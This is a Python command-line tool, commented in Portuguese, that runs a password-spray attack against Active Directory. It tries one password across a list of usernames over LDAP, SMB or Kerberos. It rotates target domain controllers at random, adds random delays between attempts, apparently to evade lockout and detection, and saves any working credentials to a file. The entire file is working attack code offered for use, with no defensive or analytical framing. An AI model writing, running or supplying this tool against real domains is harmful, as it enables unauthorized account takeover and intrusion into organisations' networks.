import random
import time
import argparse
from ldap3 import Server, Connection, NTLM
from impacket.smbconnection import SMBConnection
from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5 import constants
from impacket.krb5.types import Principal

def load_list(file_path):
    """Carrega uma lista de itens de um arquivo."""
    with open(file_path, 'r') as file:
        items = file.read().splitlines()
    return items

def ldap_spray(users, password, domain, hosts, delay_range, output_file):
    """Realiza password spray via LDAP."""
    for user in users:
        host = random.choice(hosts)
        server = Server(host, get_info=None)
        conn = Connection(server, user=f"{domain}\\{user}", password=password, authentication=NTLM)
        if not conn.bind():
            print(f"[LDAP] Failed login for {user}@{host}")
        else:
            print(f"[LDAP] Successful login for {user}@{host}")
            if output_file:
                with open(output_file, 'a') as f:
                    f.write(f"{user}:{password}@{host}\n")
        conn.unbind()
        time.sleep(random.randint(*delay_range))

def smb_spray(users, password, domain, hosts, delay_range, output_file):
    """Realiza password spray via SMB."""
    for user in users:
        host = random.choice(hosts)
        smb = SMBConnection(host, host)
        try:
            smb.login(user, password, domain)
            print(f"[SMB] Successful login for {user}@{host}")
            if output_file:
                with open(output_file, 'a') as f:
                    f.write(f"{user}:{password}@{host}\n")
        except Exception as e:
            print(f"[SMB] Failed login for {user}@{host}: {e}")
        smb.close()
        time.sleep(random.randint(*delay_range))

def kerberos_spray(users, password, domain, hosts, delay_range, output_file):
    """Realiza password spray via Kerberos."""
    for user in users:
        host = random.choice(hosts)
        try:
            principal = Principal(f"{user}@{domain}", type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            tgt, cipher, sessionKey = getKerberosTGT(principal, password, domain, host)
            print(f"[Kerberos] Successful login for {user}@{host}")
            if output_file:
                with open(output_file, 'a') as f:
                    f.write(f"{user}:{password}@{host}\n")
        except Exception as e:
            print(f"[Kerberos] Failed login for {user}@{host}: {e}")
        time.sleep(random.randint(*delay_range))

def main():
    parser = argparse.ArgumentParser(description="Perform a password spray attack against Active Directory or SMB servers.")
    parser.add_argument("--users", required=True, help="File containing list of usernames.")
    parser.add_argument("--password", required=True, help="Password to spray.")
    parser.add_argument("--domain", required=True, help="Domain name.")
    parser.add_argument("--hosts", help="List of target hosts (domain controllers or SMB servers).")
    parser.add_argument("--hosts-file", help="File containing list of target hosts.")
    parser.add_argument("--protocol", choices=["ldap", "smb", "kerberos"], required=True, help="Protocol to use: ldap, smb, or kerberos.")
    parser.add_argument("--delay-min", type=int, default=2, help="Minimum delay between requests (in seconds).")
    parser.add_argument("--delay-max", type=int, default=20, help="Maximum delay between requests (in seconds).")
    parser.add_argument("--output-file", help="File to save successful logins.")
    args = parser.parse_args()

    # Carrega a lista de usuários
    users = load_list(args.users)

    # Carrega a lista de hosts
    if args.hosts:
        hosts = args.hosts.split(',')
    elif args.hosts_file:
        hosts = load_list(args.hosts_file)
    else:
        print("Erro: É necessário fornecer hosts via --hosts ou --hosts-file.")
        return

    delay_range = (args.delay_min, args.delay_max)

    # Executa o password spray com o protocolo escolhido
    if args.protocol == "ldap":
        ldap_spray(users, args.password, args.domain, hosts, delay_range, args.output_file)
    elif args.protocol == "smb":
        smb_spray(users, args.password, args.domain, hosts, delay_range, args.output_file)
    elif args.protocol == "kerberos":
        kerberos_spray(users, args.password, args.domain, hosts, delay_range, args.output_file)

if __name__ == "__main__":
    main()
